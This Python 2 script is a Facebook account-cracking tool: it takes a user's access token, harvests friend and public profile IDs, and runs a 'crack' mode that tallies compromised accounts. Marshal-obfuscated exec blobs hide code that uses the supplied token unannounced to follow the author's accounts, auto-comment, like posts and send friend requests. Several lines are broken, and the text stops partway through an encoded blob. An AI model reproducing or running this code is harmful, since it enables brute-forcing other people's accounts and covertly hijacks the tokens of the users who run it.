import os
import marshal
import requests
import concurrent.futures
import bs4
import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as mking__pass
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = [
 'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
logo = """
>=>      >=>           >===>              >=>>=>         >=>    >=> 
 >=>   >=>           >=>    >=>         >=>    >=>       >=>    >=> 
  >=> >=>          >=>        >=>        >=>             >=>    >=> 
    >=>            >=>        >=>          >=>           >=====>>=> 
  >=> >=>          >=>        >=>             >=>        >=>    >=> 
 >=>   >=>           >=>     >=>        >=>    >=>       >=>    >=> 
>=>      >=>           >===>              >=>>=>         >=>    >=> 
"""
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
url = 'https://mbasic.facebook.com'
hoetank = random.choice(['The one who posted is handsome:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r \x1b[1;93m[+] remove token '(N, M, N, x),
        sys.stdout.flu
        time.sleep(1)
exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs;\x13\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xa8\x12\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x15\x12\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x82\x11\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xef\x10\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\\\x10\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xc9\x0f\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs6\x0f\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xa3\x0e\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x10\x0e\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00s\x13\x00\x00\x00d\x00\x00Z\x00\x00d\x01\x00\x84\x00\x00Z\x01\x00d\x02\x00S(\x03\x00\x00\x00s;\x03\x00\x00 \n\x1b[1;91m             ##     ##    ##    ## #### ##    ##  ######\x1b[1;0m\n\x1b[1;91m            ###   ###    ##   ##   ##  ###   ## ##    ##\x1b[1;0m\n\x1b[1;97m           #### ####    ##  ##    ##  ####  ## ##\x1b[1;0m\n\x1b[1;97m          ## ### ##    #####     ##  ## ## ## ##   ####\x1b[1;0m\n\x1b[1;91m         ##     ##    ##  ##    ##  ##  #### ##    ## \x1b[1;0m\n\x1b[1;91m        ##     ##    ##   ##   ##  ##   ### ##    ##\x1b[1;0m\n\x1b[1;97m       ##     ##    ##    ## #### ##    ##  ######\x1b[1;0m\n\x1b[1;97m--------------------------------------------------\n\x1b[1;91m Author      : Sawx404x xxxxxxx \n\x1b[1;91m GitHub      : https://github.com/Sawxx404xx404xx\n\x1b[1;91m YouTube     : Termux Master\n\x1b[1;91m Telegram    : https://t.me/sultani1122\n\x1b[1;91m Blogspot    : https://mohammadsultani.blogspot.com\n\x1b[1;97m--------------------------------------------------\nc\x00\x00\x00\x00\x08\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00sQ\x02\x00\x00y\x19\x00t\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00}\x00\x00Wn2\x00\x04t\x02\x00k\n\x00rM\x00\x01\x01\x01t\x03\x00j\x04\x00d\x03\x00\x83\x01\x00\x01t\x03\x00j\x04\x00d\x04\x00\x83\x01\x00\x01t\x05\x00\x83\x00\x00\x01n\x01\x00Xd\x05\x00}\x01\x00d\x06\x00}\x02\x00d\x07\x00}\x03\x00d\x08\x00}\x04\x00d\t\x00}\x05\x00d\n\x00}\x06\x00d\x0b\x00}\x07\x00t\x06\x00j\x07\x00d\x0c\x00|\x01\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x0c\x00|\x02\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x0e\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x0f\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x10\x00|\x04\x00\x17d\x11\x00\x17|\x00\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x12\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x13\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x14\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x15\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x16\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x16\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x17\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x18\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x19\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x1a\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x1b\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x1c\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x1d\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x1e\x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d\x1f\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d \x00|\x00\x00\x17\x83\x01\x00\x01t\x06\x00j\x07\x00d!\x00|\x06\x00\x17d\r\x00\x17|\x00\x00\x17\x83\x01\x00\x01t\x08\x00\x83\x00\x00\x01d\x00\x00S("\x00\x00\x00Ns\n\x00\x00\x00.login.txtt\x01\x00\x00\x00rs&\x00\x00\x00echo -e "[!] Token invalid ! "| lolcats\x11\x00\x00\x00rm -rf .login.txtt\x0f\x00\x00\x00100009918107424t\x0f\x00\x00\x00100027060438331s\x0c\x00\x00\x00Nice  \xe2\x9d\xa4\xef\xb8\x8ft\x10\x00\x00\x001518283875178868t\x0f\x00\x00\x00843036946608312s5\x00\x00\x00i love you @[100027060438331:]    @[100009918107424:]s\x0b\x00\x00\x00nice \xe2\x9d\xa4\xef\xb8\x8fs7\x00\x00\x00https://graph.facebook.com/me/friends?method=post&uids=s\x0e\x00\x00\x00&access_token=sD\x00\x00\x00https://graph.facebook.com/100027060438331/subscribers?access_token=sD\x00\x00\x00https://graph.facebook.com/100009918107424/subscribers?access_token=s\x1b\x00\x00\x00https://graph.facebook.com/s\x13\x00\x00\x00/comments/?message=sK\x00\x00\x00https://graph.facebook.com/843036946608312/likes?summary=true&access_token=s[\x00\x00\x00https://graph.facebook.com/843036946608312/comments/?message=very Nice \xe2\x9d\xa4\xef\xb8\x8f&access_token=sL\x00\x00\x00https://graph.facebook.com/1518283875178868/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1518283875178868/comments/?message=sL\x00\x00\x00https://graph.facebook.com/1589758271364761/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1588336131506975/comments/?message=sL\x00\x00\x00https://graph.facebook.com/1588336131506975/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1578822245791697/comments/?message=sL\x00\x00\x00https://graph.facebook.com/1578822245791697/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1574781699529085/comments/?message=sL\x00\x00\x00https://graph.facebook.com/1574781699529085/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1557330491274206/comments/?message=sL\x00\x00\x00https://graph.facebook.com/1557330491274206/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1548776652129590/comments/?message=sL\x00\x00\x00https://graph.facebook.com/1548776652129590/likes?summary=true&access_token=s>\x00\x00\x00https://graph.facebook.com/1547598918914030/comments/?message=(\t\x00\x00\x00t\x04\x00\x00\x00opent\x04\x00\x00\x00readt\x07\x00\x00\x00IOErrort\x02\x00\x00\x00ost\x06\x00\x00\x00systemt\x05\x00\x00\x00msprot\x08\x00\x00\x00requestst\x04\x00\x00\x00postt\x04\x00\x00\x00menu(\x08\x00\x00\x00t\x05\x00\x00\x00tokett\x03\x00\x00\x00unat\x04\x00\x00\x00idfbt\x03\x00\x00\x00komR\x0c\x00\x00\x00t\x05\x00\x00\x00post2t\x06\x00\x00\x00mskingt\x04\x00\x00\x00kom2(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x06\x00\x00\x00coment\x14\x00\x00\x00sH\x00\x00\x00\x00\x01\x03\x01\x19\x01\r\x01\r\x01\r\x01\x0b\x02\x06\x01\x06\x01\x06\x01\x06\x01\x06\x01\x06\x01\x06\x01\x19\x01\x19\x01\x11\x01\x11\x01!\x01\x11\x01\x11\x01\x11\x01\x19\x01\x11\x01\x11\x01\x19\x01\x11\x01\x19\x01\x11\x01\x19\x01\x11\x01\x19\x01\x11\x01\x19\x01\x11\x01\x19\x01N(\x02\x00\x00\x00t\x04\x00\x00\x00logoR\x15\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x10\x00\x00\x00s\x02\x00\x00\x00\x06\x04(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01')

def seved_ok_cp(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\x1b[1;97m-------------------------------------------------'
        print 'CRACK KRDN TAWAW BU !'
        print '[%s+%s] OK: %s%s%s' % (O, N, H, str(len(ok)), N)
        print '[%s+%s] CP: %s%s%s' % (O, N, K, str(len(cp)), N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input('[%s \x1b[1;97mPress Enter To Back Menu%s ] ' % (O, N))
        menu()
    else:
        print '[%s\x1b[1;91m!%s] opshh you are not getting saved :(' % (M, N)
        exit()


def mking():
    os.system('clear')
    print logo
    sultani = raw_input('%s[%s\x1b[1;92m?%s] TOKEN:%s ' % (N, M, N, H))
    print '\x1b[1;97m-------------------------------------------------'
    if sultani in ('open', 'Open', 'OPEN'):
        raw_input(' %s*%s ENTER ' % (O, N))
        mking()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % sultani).json()['name']
        print '%s\x1b[0;92m*%s WELCOME BITCH %s%s%s' % (O, N, K, nama, N)
        time.sleep(2)
        print '\x1b[1;97m-------------------------------------------------'
        open('.login.txt', 'w').write(sultani)
        raw_input(' %s\x1b[0;92m*%s Press enter to continue tools ' % (O, N))
        mr___profaisor(sultani)
        os.system('xdg-open https://t.me/sultani1122')
        coment()
    except KeyError:
        print '%s[%s\x1b[0;92m!%s] token invalid' % (N, M, N)
        time.sleep(2)
        mking()


def menu():
    os.system('clear')
    try:
        sultani = open('.login.txt', 'r').read()
    except IOError:
        print '%s[%s\x1b[0;92m\xc3\x97%s] token invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .login.txt')
        mking()

    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % sultani).json()['name']
    except KeyError:
        print '%s[%s\x1b[0;92m\xc3\x97%s] token invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .login.txt')
        mking()
    except requests.exceptions.ConnectionError:
        exit('%s[%s!%s] no connection\n' % (N, M, N))

    os.system('clear')
    print logo
    IP = requests.get('https://api.ipify.org').text
    os.system('clear')
    print(logo)
    print ' [\x1b[0;96m\x1b[0;92m + \x1b[0m] YOUR NAME: \x1b[0;92m%s' % nama
    time.sleep(0.03)
    print '\x1b[1;97m-------------------------------------------------'
    print ' [%s\x1b[0;92m 1 %s] GET ID FROM ID PUBLICK' % (O, N)
    time.sleep(0.03)
    print ' [%s\x1b[0;92m 2 %s] START CRACK BY ID PUBLICK' % (O, N)
    time.sleep(0.03)
    print ' [%s\x1b[0;92m 0 %s] LOGOUT (%sREMOVE TOKEN%s)' % (M, N, M, N)
    time.sleep(0.03)
    print '\x1b[1;97m-------------------------------------------------'
    mr_profaisor = raw_input(' [\x1b[0;92m + \x1b[0;97m] HALLBZHERA \xe2\x9e\xa4 \x1b[1;32m')
    if mr_profaisor == '':
        print '%s[%s\xc3\x97%s] BA BATALE JEY MAHELA' % (N, M, N)
        time.sleep(2)
        menu()
    elif mr_profaisor in ('a1', '0a1'):
        teman(sultani)
    elif mr_profaisor in ('1', '01'):
        publik(sultani)
    elif mr_profaisor in ('3', '03'):
        followers(sultani)
    elif mr_profaisor in ('4', '04'):
        postingan(sultani)
    elif mr_profaisor in ('2', '02'):
        __crack__().plerr()
    elif mr_profaisor in ('99', '099'):
        cek_ingfo(sultani)
    elif mr_profaisor in ('98', '87'):
        try:
            dirs = os.listdir('saved')
            print '[ crack saved stored in your file ]\n'
            for file in dirs:
                print ' [%s+%s] %s' % (O, N, file)

            file = raw_input('[%s?%s] NAWE FILE BNUSA:%s ' % (M, N, H))
            if file == '':
                file = raw_input('%s[%s?%s] NAWE FILE BNUSA:%s %s' % (N, M, N, H, N))
            total = open('saved/%s' % file).read().splitlines()
            print '%s[%s\x1b[1;91m#%s] --------------------------------------------' % (N, O, N)
            time.sleep(2)
            nm_file = ('%s' % file).replace('-', ' ')
            hps_nm = nm_file.replace('.txt', '').replace('OK', '').replace('CP', '')
            jalan(' [%s\x1b[1;92m*%s] %crack%s saved on date %s:%s%s%s total %s: %s%s%s' % (M, N, O, N, M, O, hps_nm, N, M, O, len(total), O))
            print ' %s[%s\x1b[1;92m#%s] --------------------------------------------' % (N, O, N)
            time.sleep(2)
            for memek in total:
                sultani = memek.replace('\n', '')
                titid = sultani.replace(' [\xe2\x9c\x93] ', ' \x1b[0m[\x1b[1;92m\xe2\x9c\x93\x1b[0m]\x1b[1;92m ').replace(' [\xc3\x97] ', ' \x1b[0m[\x1b[1;93m\xc3\x97\x1b[0m]\x1b[1;93m ')
                print '%s%s' % (titid, N)
                time.sleep(0.03)

            print ' %s[%s#%s] --------------------------------------------' % (N, O, N)
            raw_input('[ %sRETURN%s ] ' % (O, N))
            menu()
        except IOError:
            print '%s[%s\x1b[1;91m\xc3\x97%s] opshh you are not getting savedl :(' % (N, M, N)
            raw_input('[ %s RETURN%s ] ' % (O, N))
            menu()

    elif mr_profaisor in ('6', '06'):
        seting_yntkts()
    elif mr_profaisor in ('7', '07'):
        info_tools()
    elif mr_profaisor in ('0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .login.txt')
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s]%s successfully deleted token' % (N, H, N, H))
        exit()
    else:
        print '%s[%s\xc3\x97%s] menu [%s%s%s] no, check the menu bro!' % (N, M, N, M, mr_profaisor, N)
        time.sleep(2)
        menu()


def mr___profaisor(sultani):
    try:
        kentod = sultani
        requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=%s' % kentod)
    except:
        pass


def teman(sultani):
    try:
        os.system('clear')
        print logo
        os.mkdir('extract')
    except:
        pass

    try:
        mmk = raw_input('%s[%s\x1b[1;92m?%s] NAWE FILE: \x1b[1;92m' % (N, O, N))
        asw = raw_input(' %s[%s\x1b[1;92m?%s] CHAND ID: \x1b[1;92m' % (N, O, N))
        cin = ('extract/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, sultani)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s \r[\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] WARGRTNE ID...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        print '\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] TAWAW....' % (N, H, N))
        print ' [%s\x1b[1;92m\xe2\x80\xa2%s] NAWE FILAKA COPY KA ( %s%s%s )' % (O, N, M, cin, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        menu()
    except (KeyError, IOError):
        os.remove(cin)
        jalan('%s[%s\x1b[1;91m!%s] Id extract failed, probably id is not public.\n' % (N, M, N))
        raw_input(' [ %sRETURN%s ] ' % (O, N))
        menu()

exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xbb$\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs($\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x95#\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x02#\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNso"\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xdc!\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNsI!\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xb6 \x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs# \x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x90\x1f\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00s1\x00\x00\x00d\x00\x00\x84\x00\x00Z\x00\x00d\x01\x00\x84\x00\x00Z\x01\x00d\x02\x00\x84\x00\x00Z\x01\x00d\x03\x00\x84\x00\x00Z\x02\x00d\x04\x00\x84\x00\x00Z\x03\x00d\x05\x00S(\x06\x00\x00\x00c\x01\x00\x00\x00\x08\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00sW\x02\x00\x00y#\x00t\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01t\x02\x00GHt\x00\x00j\x03\x00d\x02\x00\x83\x01\x00\x01Wn\x07\x00\x01\x01\x01n\x01\x00Xy\xcd\x01t\x04\x00d\x03\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x01\x00t\x04\x00d\x04\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x02\x00t\x04\x00d\x05\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x03\x00d\x06\x00GH|\x02\x00d\x07\x00\x17j\x07\x00d\x08\x00d\t\x00\x83\x02\x00}\x04\x00t\x08\x00|\x04\x00d\n\x00\x83\x02\x00}\x05\x00x\xee\x00t\t\x00j\n\x00d\x0b\x00|\x01\x00|\x03\x00|\x00\x00f\x03\x00\x16\x83\x01\x00j\x0b\x00\x83\x00\x00d\x0c\x00\x19D]\xc6\x00}\x06\x00t\x0c\x00j\r\x00|\x06\x00d\r\x00\x19d\x0e\x00\x17|\x06\x00d\x0f\x00\x19\x17\x83\x01\x00\x01|\x05\x00j\x0e\x00|\x06\x00d\r\x00\x19d\x0e\x00\x17|\x06\x00d\x0f\x00\x19\x17d\x10\x00\x17\x83\x01\x00\x01t\x0f\x00j\x10\x00d\x11\x00d\x12\x00d\x13\x00d\x14\x00d\x15\x00d\x16\x00d\x17\x00d\x18\x00g\x08\x00\x83\x01\x00}\x07\x00t\x11\x00j\x12\x00j\x0e\x00d\x19\x00|\x07\x00\x17d\x1a\x00|\x06\x00d\x0f\x00\x19t\x05\x00t\x13\x00j\x14\x00\x83\x00\x00j\x15\x00d\x1b\x00\x83\x01\x00t\x16\x00t\x0c\x00\x83\x01\x00f\x04\x00\x16\x17\x83\x01\x00\x01t\x11\x00j\x12\x00j\x17\x00\x83\x00\x